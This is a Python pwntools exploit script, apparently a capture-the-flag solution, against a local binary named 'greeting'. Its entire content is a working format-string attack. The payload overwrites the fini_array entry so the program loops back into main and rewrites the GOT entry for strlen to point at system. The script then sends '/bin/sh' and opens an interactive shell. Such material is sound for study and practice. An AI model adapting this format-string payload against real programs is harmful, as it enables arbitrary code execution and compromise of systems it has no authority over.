from pwn import *

target = process('greeting')

# The values we will be overwritting
finiArray = 0x08049934  # is | grep fini_array
                        # cause there's no proper function being called after main 
                        # so we need to loop back after main
                        # we choose function table in finiArray and overwrite it with getline
strlenGot = 0x08049a54  # objdump -R greeting | grep strlen

# The values we will be overwritting with
getline = 0x8048614     # loop back address(main:before getnline)
systemPlt = 0x8048490   # afl

# Just a bit of padding
payload = b"xx"

# Address of fini array
payload += p32(finiArray)

# Address of fini array + 2
payload += p32(finiArray + 2)

# Address of got entry for strlen
payload += p32(strlenGot)

# Address of got entry for strlen + 2
payload += p32(strlenGot + 2)

# Write the lower two bytes of the fini array with loop around address (getline setup)
payload += b"%34288x"
payload += b"%12$n"

# Write the lower two bytes of the plt system address to the got strlen entry
payload += b"%65148x"
payload += b"%14$n"

# Write the higher two bytes of the two address we just wrote to
# Both are the same (0x804)
payload += b"%33652x"
payload += b"%13$n"
payload += b"%15$n"

# Print the length of our fmt string (make sure we meet the size requirement)
print("len: " + str(len(payload)))

# Send the format string
target.sendline(payload)

# Send '/bin/sh' to trigger the system('/bin/sh') call
target.sendline('/bin/sh')

# Drop to an interactive shell
target.interactive()